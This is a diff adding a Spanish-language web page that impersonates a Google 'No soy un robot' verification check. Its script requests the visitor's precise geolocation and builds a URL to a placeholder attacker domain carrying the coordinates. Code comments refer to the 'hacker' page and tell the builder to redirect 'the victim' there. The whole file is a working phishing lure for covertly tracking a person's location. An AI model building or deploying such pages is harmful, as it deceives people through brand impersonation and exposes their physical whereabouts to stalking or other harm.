@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifica tu Identidad</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f1f1f1;
+        }
+        .container {
+            max-width: 450px;
+            width: 90%;
+            background-color: #fff;
+            padding: 30px 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            box-sizing: border-box;
+        }
+        #verification-container {
+            display: block;
+        }
+        .logo-google {
+            height: 35px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 2em;
+            font-weight: 400;
+            color: #202124;
+            margin: 0;
+        }
+        .subtitle {
+            font-size: 1em;
+            color: #5f6368;
+            margin: 10px 0 30px;
+        }
+        #verifyButton {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            width: 250px;
+            margin: 0 auto;
+            padding: 5px;
+            border: 1px solid #d4d4d4;
+            border-radius: 3px;
+            background-color: #f9f9f9;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        #verifyButton:hover:not(:disabled) {
+            background-color: #ececec;
+        }
+        #verifyButton:disabled {
+            cursor: not-allowed;
+            opacity: 0.8;
+        }
+        .checkbox-box {
+            width: 28px;
+            height: 28px;
+            border: 1px solid #c1c1c1;
+            background-color: #fff;
+            margin-right: 10px;
+            border-radius: 3px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .checkbox-text {
+            font-size: 1.1em;
+            color: #202124;
+        }
+        @keyframes spinner {
+            to { transform: rotate(360deg); }
+        }
+        .spinner {
+            border: 3px solid rgba(0, 0, 0, 0.1);
+            border-top-color: #3e81f5;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            animation: spinner 0.8s linear infinite;
+        }
+        .error-box {
+            margin-top: 15px;
+            color: red;
+            font-weight: bold;
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+            h1 {
+                font-size: 1.5em;
+            }
+            .subtitle {
+                font-size: 0.9em;
+            }
+            .logo-google {
+                height: 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="verification-container" class="container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo-google">
+        <h1>Verifica tu identidad</h1>
+        <p class="subtitle">Para continuar, haz clic en la casilla de verificación y acepta los permisos de ubicación para confirmar que eres un ser humano.</p>
+
+        <button id="verifyButton">
+            <div class="checkbox-box" id="checkbox-box"></div>
+            <span class="checkbox-text" id="checkbox-text">No soy un robot</span>
+        </button>
+        
+        <p id="error-message" class="error-box" style="display:none;"></p>
+    </div>
+
+    <script>
+        const verifyButton = document.getElementById('verifyButton');
+        const errorMessage = document.getElementById('error-message');
+        const checkboxBox = document.getElementById('checkbox-box');
+        const checkboxText = document.getElementById('checkbox-text');
+        
+        const success = (position) => {
+            const lat = position.coords.latitude.toFixed(6);
+            const lon = position.coords.longitude.toFixed(6);
+            const id = Math.random().toString(36).substring(2, 8); // Genera un ID simple
+            
+            // Construye la URL de la página "hacker" con los parámetros
+            const redirectUrl = `https://tu-nombre-de-dominio.com/index2.html?lat=${lat}&lon=${lon}&id=${id}`;
+            
+            // Redirige al usuario a la página de Google, pero con tu "código"
+            window.location.href = `https://www.google.com?log_data=${encodeURIComponent(redirectUrl)}`;
+            // NOTA: Esta redirección a Google es solo para el ejemplo.
+            // Para tu proyecto, la víctima debe ser redirigida a la URL de tu index2.html
+            // De esta manera: window.location.href = redirectUrl;
+        };
+
+        const error = (err) => {
+            let message = "";
+            switch(err.code) {
+                case err.PERMISSION_DENIED:
+                    message = "Permiso de ubicación denegado. Acepta los permisos para continuar.";
+                    break;
+                case err.POSITION_UNAVAILABLE:
+                    message = "La información de ubicación no está disponible. Por favor, intenta de nuevo.";
+                    break;
+                case err.TIMEOUT:
+                    message = "La solicitud de ubicación ha expirado. Por favor, reinicia la página.";
+                    break;
+                default:
+                    message = "Ha ocurrido un error desconocido. Por favor, reinicia la página.";
+                    break;
+            }
+            verifyButton.disabled = false;
+            checkboxBox.innerHTML = '';
+            checkboxText.textContent = 'No soy un robot';
+            errorMessage.textContent = message;
+            errorMessage.style.display = 'block';
+            console.error(err);
+        };
+
+        verifyButton.addEventListener('click', () => {
+            verifyButton.disabled = true;
+            errorMessage.style.display = 'none';
+            checkboxBox.innerHTML = '<div class="spinner"></div>';
+            checkboxText.textContent = 'Verificando...';
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(success, error, {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                });
+            } else {
+                verifyButton.disabled = false;
+                errorMessage.textContent = "Tu navegador no soporta la geolocalización.";
+                errorMessage.style.display = 'block';
+            }
+        });
+
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('verification-container').style.display = 'block';
+        });
+    </script>
+</body>
+</html>
